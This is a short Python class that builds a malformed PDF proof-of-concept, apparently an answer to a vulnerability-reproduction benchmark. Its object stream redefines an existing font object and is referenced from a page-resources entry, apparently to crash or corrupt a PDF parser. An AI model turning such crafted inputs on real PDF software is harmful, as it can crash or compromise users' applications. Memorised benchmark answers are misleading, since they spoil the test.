class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'%PDF-1.7\n'
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n'
        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 /Resources << /ExtGState << /GS1 5 0 R >> >> >>\nendobj\n\n'
        obj3 = b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R >> >> /Contents 6 0 R >>\nendobj\n\n'
        obj4 = b'4 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n\n'
        index_part = b'4 0 5'
        dict_part = b'<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>'
        stream_data = index_part + dict_part
        stream_len = len(stream_data)
        obj5 = b'5 0 obj\n<< /Type /ObjStm /N 1 /First 5 /Length ' + str(stream_len).encode() + b' >>\nstream\n' + stream_data + b'\nendstream\nendobj\n\n'
        contents_stream = b'BT /F1 24 Tf 100 700 Td (Hello World) Tj ET'
        contents_length = len(contents_stream)
        obj6 = b'6 0 obj\n<< /Length ' + str(contents_length).encode() + b' >>\nstream\n' + contents_stream + b'\nendstream\nendobj\n\n'
        body = obj1 + obj2 + obj3 + obj4 + obj5 + obj6
        current_offset = len(header)
        offsets = [0] * 6
        offsets[0] = current_offset
        current_offset += len(obj1)
        offsets[1] = current_offset
        current_offset += len(obj2)
        offsets[2] = current_offset
        current_offset += len(obj3)
        offsets[3] = current_offset
        current_offset += len(obj4)
        offsets[4] = current_offset
        current_offset += len(obj5)
        offsets[5] = current_offset
        xref = b'xref\n0 7\n0000000000 65535 f \n'
        for off in offsets:
            xref += f'{off:010d} 00000 n \n'.encode()
        trailer = b'trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n'
        startxref_pos = len(header + body + xref)
        trailer += str(startxref_pos).encode() + b'\n%%EOF'
        poc = header + body + xref + trailer
        return poc
